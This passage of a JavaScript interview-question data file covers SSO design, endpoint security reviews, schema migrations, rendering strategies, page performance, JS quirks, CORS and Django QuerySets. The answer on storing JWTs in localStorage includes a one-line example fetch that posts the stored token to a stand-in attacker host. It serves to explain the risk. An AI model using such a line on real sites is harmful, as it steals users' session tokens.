SPEED MATTERS. A 30-min test suite stops getting run. Parallelize, share DB setup with transactions (rollback after each test), avoid sleep().`,
    keywords: ["testing", "unit", "e2e", "pyramid", "Playwright"],
  },

  // ============================================================
  // ============== LEAD ==============
  // ============================================================
  {
    id: 100, level: "lead", topic: "auth",
    q: "Design SSO across multiple internal apps.",
    a: `GOAL: one login → access all internal apps without re-entering credentials.

ARCHITECTURE: an IDENTITY PROVIDER (IdP) — Keycloak, Auth0, Okta, or roll your own — issues tokens that all apps trust.

PROTOCOLS:
• OIDC (OpenID Connect) — modern. OAuth 2.0 + ID token. Use this.
• SAML 2.0 — older, XML-based, popular in enterprise. Use if customers demand it.

FLOW (OIDC, internal SSO):
1. User opens app1.company.com → not logged in → redirect to idp.company.com/auth.
2. IdP authenticates (password + MFA, or via corporate SSO chain — Google Workspace, AzureAD, etc.).
3. IdP redirects back with a CODE → app1 exchanges it for an ID TOKEN + access token.
4. app1 sets a session cookie (or its own JWT) for THAT app.
5. User opens app2.company.com → redirect to IdP. IdP sees the IdP session cookie → silently issues a code → app2 has a session immediately. No prompt.

LOG OUT: complicated. Single Logout (SLO) — IdP notifies all apps to clear their sessions.

IMPLEMENTATION TIPS:
• Don't roll your own IdP unless you must — Keycloak is free and battle-tested.
• Use mTLS or signed JWTs for service-to-service auth (not user tokens).
• Centralize permissions (groups in IdP, claims in token), but each app still enforces what it's allowed to do.
• Plan for graceful IdP downtime — short access token caching, fallbacks.
• MFA at the IdP — every app inherits it for free.
• Audit: every login, every consent, every token issuance logged centrally.`,
    keywords: ["SSO", "OIDC", "SAML", "Keycloak", "IdP"],
  },
  {
    id: 101, level: "lead", topic: "security",
    q: "How would you do a security review of a new endpoint?",
    a: `CHECKLIST — for a senior+ to walk through any new endpoint before merging:

AUTHENTICATION
• Is auth required? If anonymous, why?
• Token validation: expiry, signature, audience, issuer all checked?
• Rate limit on unauthenticated endpoints: yes / no / how?

AUTHORIZATION
• Is this object-level access? Does the code verify the user OWNS the resource?
• Role/permission check enforced server-side (NEVER trust the client)?
• Check IDOR: GET /orders/123 — does the code verify order.user_id == current_user.id?

INPUT VALIDATION
• Schema (Pydantic / DRF Serializer / Zod) on every field?
• Length limits, type bounds, allowed values?
• File uploads: type, size, virus scan, store on S3 (not local disk), serve via signed URLs.

OUTPUT
• Does the response leak fields the user shouldn't see (passwords, tokens, internal IDs)?
• Errors: do you return stack traces or "user not found"?

INJECTION
• Any raw SQL? f-string in queries?
• Any shell exec or eval of user input? Any unsafe deserialization (yaml.load, marshal)?
• HTML rendering — auto-escaped?

RESOURCE LIMITS
• Pagination capped (max 100/page)?
• Time-out on long DB queries?
• SSRF prevention if the endpoint fetches a URL?

OBSERVABILITY
• Audit log entry for sensitive actions (delete, role change, money movement)?

DEPLOYMENT
• Secret in env vars, not in code/config repo?
• Headers: HSTS, CSP, X-Content-Type-Options, X-Frame-Options.

Make it a PR template question. Make security part of "definition of done", not an afterthought.`,
    keywords: ["security", "review", "checklist", "IDOR", "audit"],
  },
  {
    id: 102, level: "lead", topic: "deploy",
    q: "Strategy: zero-downtime DB migration with breaking schema changes.",
    a: `THE PROBLEM: you need to drop a column / rename / change type without taking the app down. Direct ALTER + deploy = "users see 500s during cutover".

THE PATTERN: EXPAND → MIGRATE → CONTRACT (a.k.a. parallel change).

EXAMPLE: rename column "fullname" to "name".

PHASE 1 — EXPAND (deploy 1):
• Migration: ADD COLUMN name VARCHAR(255).
• App code: write to BOTH columns, read from fullname (no behavior change for users).
• Deploy. Both columns coexist; old code on old replicas still works during rolling deploy.

PHASE 2 — BACKFILL:
• Background script copies fullname → name in batches with sleeps to avoid lock pressure.
• Verify: zero rows where name IS NULL AND fullname IS NOT NULL.

PHASE 3 — SWITCH READS (deploy 2):
• App code: write to BOTH, read from name.
• Deploy. If anything's wrong, revert (still safe: old reads from fullname).

PHASE 4 — CONTRACT (deploy 3):
• App code: write to name only.
• Migration: DROP COLUMN fullname.
• Deploy.

KEY RULES:
• A migration must be backward-compatible with the PREVIOUS deployed code, because rolling deploy means old + new code run simultaneously.
• NEVER do "DROP + ADD" in one migration — that's a delete and a create.
• Big tables: avoid full-table rewrites that take ACCESS EXCLUSIVE locks. ADD COLUMN with a default in older PG versions used to lock the whole table; PG 11+ added fast default for nullable. Test on a copy of prod data first.
• Indexes: CREATE INDEX CONCURRENTLY (no table lock).
• Foreign keys: add NOT VALID, then VALIDATE in a separate step.

TOOLS: Django migrations, alembic, sqitch, gh-ost (MySQL), pg-osc.`,
    keywords: ["migration", "expand-contract", "zero-downtime", "schema"],
  },
  {
    id: 103, level: "lead", topic: "react",
    q: "When does it make sense to switch from SPA to SSR / RSC / SSG?",
    a: `FOUR RENDERING MODES:

1. SPA (Single Page App) — server returns an empty HTML shell + JS bundle; React renders client-side.
   GOOD: app-like UX, less server cost, easy to deploy as static.
   BAD: empty white screen until JS loads (poor LCP), bad for SEO without effort, slow on low-end devices.

2. SSR (Server-Side Rendering) — server renders the React tree to HTML on each request, ships HTML + JS for hydration.
   GOOD: fast first paint, SEO-friendly, personalization works.
   BAD: needs a Node/Edge server, every request costs CPU.
   USE: Next.js Pages Router, Nuxt, Remix.

3. SSG (Static Site Generation) — render at BUILD time to static HTML files.
   GOOD: cheapest hosting, fastest TTFB, perfect for SEO.
   BAD: only for content that doesn't change per user. Long builds for big sites.
   USE: Astro, Next.js getStaticProps.

4. RSC (React Server Components) — components that run only on the server, never ship to the client. Mix freely with client components.
   GOOD: zero JS for server-only parts, smaller bundles, can talk directly to the DB from a component.
   BAD: new mental model; you must clearly partition server vs client.
   USE: Next.js App Router, modern Remix.

WHEN TO MOVE:
• SEO is critical (marketing site, e-commerce) → SSG / SSR.
• Time-to-interactive matters more than complex client interactions → RSC + minimal client islands.
• Heavy data-fetching, want to keep secrets out of the bundle → RSC or BFF.
• Low-end devices, poor networks (large mobile audience) → less client JS = better.

DON'T MIGRATE BLINDLY. SPA is fine for an internal admin tool. SSR adds operational complexity (Node hosting, cache invalidation, hydration mismatches). Measure first, justify second.`,
    keywords: ["SSR", "SPA", "RSC", "SSG", "Next.js"],
  },
  {
    id: 104, level: "lead", topic: "perf",
    q: "Strategy for reducing a 5s page load to under 1s.",
    a: `MEASURE FIRST. Don't guess.

1. Run Lighthouse + check Real User Monitoring (RUM). Identify which Core Web Vital is failing.
2. Open DevTools Network — what's blocking? What's biggest? When does first paint happen?

COMMON WINS, ORDERED BY IMPACT-PER-EFFORT:

A. CDN + caching (often the biggest win).
   • Static assets behind a CDN (CloudFront, Fastly, Bunny).
   • HTML cached at edge for short TTL (10–60s) for anonymous pages.
   • Cache headers: hashed assets immutable, HTML no-cache.

B. Reduce JS shipped.
   • Bundle analyzer: any 200KB lib used for one feature? Replace or lazy-load.
   • Code-split routes.
   • Tree-shaking on (modern bundlers do this; check no broken side-effect imports).
   • Drop polyfills targeting browsers you don't support (modern build).

C. Critical rendering path.
   • Inline critical CSS, defer the rest.
   • async / defer all non-essential <script>.
   • Preconnect to known domains (fonts, API).
   • Self-host fonts; use font-display: swap.

D. Images.
   • srcset for responsive sizes.
   • Modern formats (webp, avif).
   • lazy-load below-the-fold images.
   • Width/height attributes to prevent CLS.

E. Backend / API.
   • Cache hot endpoints (Redis).
   • Avoid blocking the first paint on a slow API; load above-fold content first, defer the rest.
   • DB indexes on the queries the homepage makes.
   • If using SSR, edge cache the rendered HTML for anonymous users.

F. Compression.
   • Brotli for text > gzip > none.

G. HTTP/2 or HTTP/3.

H. Observation.
   • web-vitals.js → send to your analytics.
   • Look at p95/p99, not average.

DOWNSTREAM: a 1s page on a fast laptop with fiber may be 5s on a 3-year-old phone on 3G. Always test on a real device + throttled network.`,
    keywords: ["performance", "CDN", "core-web-vitals", "LCP"],
  },

  // ============================================================
  // ============== TRICKY ==============
  // ============================================================
  {
    id: 200, level: "tricky", topic: "js",
    q: "What does this print? [1, 2, 3].map(parseInt)",
    a: `Output: [1, NaN, NaN]

WHY:
.map calls parseInt(value, index, array). parseInt's signature is parseInt(string, radix).

Iteration:
• parseInt("1", 0)  → radix 0 means "auto-detect" → 1.
• parseInt("2", 1)  → radix must be in [2,36], 1 is invalid → NaN.
• parseInt("3", 2)  → "3" in base 2 is invalid → NaN.

LESSON: be wary of passing variadic-arg functions to .map. Either wrap (x => parseInt(x, 10)) or use Number / +x for simple cases.`,
    keywords: ["parseInt", "map", "radix", "tricky"],
  },
  {
    id: 201, level: "tricky", topic: "js",
    q: "typeof null — what does it return and why?",
    a: `typeof null → "object"

This is a 25-year-old bug in JavaScript. In the original implementation, values were tagged with a 1-3 bit type tag in their first byte. The tag for OBJECT was 000, and null was represented as the all-zeros pointer — so its type tag was also 000.

It's been kept for backward compatibility — fixing it would break the web.

To check for null specifically: value === null.
To distinguish null from object: value !== null && typeof value === "object".

OTHER TYPEOF GOTCHAS:
• typeof []         → "object"  (arrays are objects)
• typeof function(){} → "function"
• typeof NaN        → "number"  (yes, Not-a-Number is a number)
• typeof undefined  → "undefined"`,
    keywords: ["typeof", "null", "tricky", "bug"],
  },
  {
    id: 202, level: "tricky", topic: "js",
    q: "What does \"this\" refer to in JS? Walk through the rules.",
    a: `\`this\` is determined AT CALL TIME (not definition time), except for arrow functions.

RULES (in order):
1. NEW BINDING — fn called with new → this = freshly created object.
   const o = new Foo()  // this inside Foo = o

2. EXPLICIT BINDING — fn.call(ctx) / fn.apply(ctx) / fn.bind(ctx).
   greet.call({ name: "A" })  // this = { name: "A" }

3. METHOD BINDING — obj.fn() → this = obj.
   user.greet()  // this = user

4. DEFAULT BINDING — plain fn() → this = undefined in strict mode, globalThis otherwise.
   greet()  // this = undefined / window

ARROW FUNCTIONS — no this of their own. They INHERIT from the enclosing scope.
  const o = {
    name: "X",
    greet: () => console.log(this.name),  // ← inherits from where the OBJECT LITERAL was defined; this = window
  }
  o.greet()  // undefined

CLASSIC TRAP — handlers losing this:
  class Btn {
    label = "Hi";
    onClick() { console.log(this.label); }
  }
  el.addEventListener("click", btn.onClick);  // this = element, not btn
  el.addEventListener("click", () => btn.onClick());  // arrow keeps btn
  el.addEventListener("click", btn.onClick.bind(btn));  // explicit bind`,
    keywords: ["this", "binding", "arrow", "tricky"],
  },
  {
    id: 203, level: "tricky", topic: "js",
    q: "0.1 + 0.2 === 0.3 — what does it return?",
    a: `false. The result is 0.30000000000000004.

WHY: JS numbers are IEEE 754 double-precision floats. 0.1 and 0.2 cannot be represented EXACTLY in binary (the same way 1/3 can't be represented exactly in decimal). The sum is the closest representable float, which is slightly above 0.3.

CORRECT EQUALITY for floats:
  Math.abs(a - b) < Number.EPSILON  // for very small comparisons
  Math.abs(a - b) < 1e-9            // for general-purpose tolerance

FOR MONEY: don't use floats. Either:
• Store cents as integers (price = 1099 means $10.99).
• Use a decimal library (decimal.js, big.js).
• Database: NUMERIC/DECIMAL, never FLOAT.

SAME bug exists in Python (0.1 + 0.2), Java, C#, Go — anywhere using IEEE 754. Python has decimal.Decimal for exact math.`,
    keywords: ["float", "IEEE-754", "0.1", "money"],
  },
  {
    id: 204, level: "tricky", topic: "auth",
    q: "Why is putting a JWT in localStorage controversial?",
    a: `XSS = game over. Once an attacker runs JS on your origin (any vulnerability anywhere on the site), they can:
  fetch("//evil/", { method: "POST", body: localStorage.getItem("jwt") });

Now they have a valid token until expiry. They don't even need to log in — they can call your API as the user from anywhere.

A cookie with HttpOnly is immune to this — JS can't read it.

COMMON COUNTERARGUMENTS AND REBUTTALS:
"But CSRF doesn't work with localStorage tokens." Yes — that's the trade. You're picking your poison: cookies → CSRF (manageable with SameSite + tokens), localStorage → XSS (catastrophic if it happens).

"My CSP blocks XSS." A real defense, but: every <script> nonce, every templating mistake, every npm dep is a potential bypass. Defense in depth says don't rely on one layer.

"I refresh tokens every 15 min." Helps after the fact, but the attacker can refresh too if they have the refresh token. Need rotation + reuse detection.

THE PRACTICAL ANSWER for 2026:
• Refresh token in HttpOnly cookie (Secure + SameSite=Strict on the refresh route).
• Access token in MEMORY (lost on tab close, refreshed silently from cookie).
• Don't store auth in localStorage.

This is the pattern used by Auth0, Okta, AWS Cognito, etc., for SPAs.`,
    keywords: ["JWT", "localStorage", "XSS", "tricky"],
  },
  {
    id: 205, level: "tricky", topic: "cors",
    q: "I added CORS headers and it still doesn't work — what's a non-obvious cause?",
    a: `Common non-obvious causes:

1. Headers only on success. Your error response (500) doesn't include Access-Control-Allow-Origin → browser hides the real error and complains "CORS error". Always set CORS headers on ALL responses.

2. Preflight returns non-2xx. The OPTIONS request must return 2xx. Many auth middlewares helpfully return 401 on OPTIONS (no auth header) — kills the preflight. Skip auth on OPTIONS.

3. Echoing Origin without Vary. You set Access-Control-Allow-Origin: <request-origin> dynamically. But your CDN caches one response per URL. User from origin A populates the cache; user from origin B gets A's cached response with the wrong header → CORS fails. Fix: Vary: Origin.

4. Credentials + wildcard. Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true → browser rejects. Must echo the specific origin.

5. Mismatched scheme/port. http://localhost:3000 ≠ https://localhost:3000 ≠ http://localhost:3001 — three different origins.

6. Two layers setting CORS. nginx sets headers; the app also sets them; browser sees duplicates → rejects. Pick ONE place.

7. Caching the preflight too aggressively. You change CORS config but the browser cached a previous preflight (Access-Control-Max-Age: 86400 = 24h). Try a different browser / incognito to confirm.

8. Auth header but no fetch(creds). With Authorization header, you don't need credentials: 'include'. With cookie auth, you do. They're often confused.

DEBUG: Network tab → click failing request → look at PREFLIGHT (OPTIONS) and the actual request. The browser console message names the missing header — read it carefully.`,
    keywords: ["CORS", "preflight", "Vary", "cookies", "tricky"],
  },
  {
    id: 206, level: "tricky", topic: "django",
    q: "When does Django's QuerySet actually hit the DB?",
    a: `QuerySets are LAZY. They build up a SQL query, but only execute when you actually consume the results.

EXECUTES THE QUERY:
• Iteration: for x in qs:
• list(qs), tuple(qs)
• bool(qs) — explicit check
• len(qs)
• Slicing with a step: qs[::2]
• Aggregation: qs.aggregate(...), qs.count(), qs.exists()
• Serialization (cache.set(qs))
• repr(qs) (to show first 21 in REPR_OUTPUT_SIZE)
• Printing

DOES NOT EXECUTE:
• qs.filter(), .exclude(), .order_by(), .annotate() — these RETURN a new QuerySet.
• Slicing without a step (qs[:10]) — adds LIMIT/OFFSET to the SQL, doesn't execute yet.
• Assigning: qs2 = qs.filter(active=True).

TRAPS:
• if qs: → causes count + cache. If you also iterate later, you have a cache. If you just check existence, use qs.exists() (cheaper SQL).
• Two iterations of the same QuerySet hit DB twice unless you list() it once.
• qs.count() in a template followed by {% for x in qs %} → 2 queries. Use {{ qs.count }} carefully.

CACHING:
Once iterated, the QuerySet caches the rows. Calling list(qs) again won't re-query. But .filter() returns a NEW QuerySet — no shared cache.`,
    keywords: ["QuerySet", "lazy", "Django", "exists", "tricky"],
  },
];
